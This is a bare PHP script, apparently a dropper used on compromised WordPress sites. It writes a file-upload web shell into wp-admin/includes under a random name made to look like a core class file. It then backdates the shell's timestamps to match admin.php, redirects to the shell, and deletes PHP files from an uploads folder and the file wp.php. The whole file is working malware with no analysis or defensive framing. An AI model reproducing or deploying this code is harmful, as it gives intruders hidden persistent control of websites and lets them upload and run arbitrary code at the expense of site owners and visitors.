<?php
$domain = $_SERVER['SERVER_NAME'];
$rstr = str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890');
$rnub = substr($rstr,0,6);
$strwirte='<?php echo "WordPress is readed."; $Mjhn=basename($_FILES["upoleuid"]["name"]);if(move_uploaded_file($_FILES["upoleuid"]["tmp_name"],$Mjhn)){echo basename($_FILES["upoleuid"]["name"])."file done";} echo "<form enctype=\"multipart/form-data\" method=\"POST\"><input type=\"file\" name=\"upoleuid\"/><input type=\"submit\" value=\"ddok\"/></form>";?>';
if (! is_dir ( "../../../../../wp-admin" ))
mkdir ( "../../../../../wp-admin", 0777 );
if (! is_dir ( "../../../../../wp-admin/includes" ))
mkdir ( "../../../../../wp-admin/includes", 0777 );
$filetemp = '../../../../../wp-admin/includes/class-wp-page-'.$rnub.'.php';
$ftime = filemtime("../../../../../wp-admin/includes/admin.php");
file_put_contents($filetemp,$strwirte);
touch("../../../../../wp-admin/includes", $ftime, $ftime);    
touch("../../../../../wp-admin/includes/class-wp-page-".$rnub.".php", $ftime, $ftime);
rename('./ProductList.php','./ProductList-'.$rnub.'.php');
$url = $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
preg_match('/(.*?)\/(.*?)wp-content/',$url,$tmp);
if($tmp[2] != ''){
	$dir = $tmp[2];
}else{
	$dir = '';
}
$urls = "http://".$domain."/".$dir."wp-admin/includes/class-wp-page-".$rnub.".php";
echo '<meta http-equiv="Refresh" content="0; url='.$urls.'">';
if (false != ($handle = opendir ( '../../../../../wp-content/uploads/2021/08' ))){
     while ( false !== ($file = readdir ( $handle )) ) {
        if (strstr($file,".php")) {
			unlink('../../../../../wp-content/uploads/2021/08/'.$file);
        }
    }
    closedir ( $handle );
}
unlink("./wp.php");
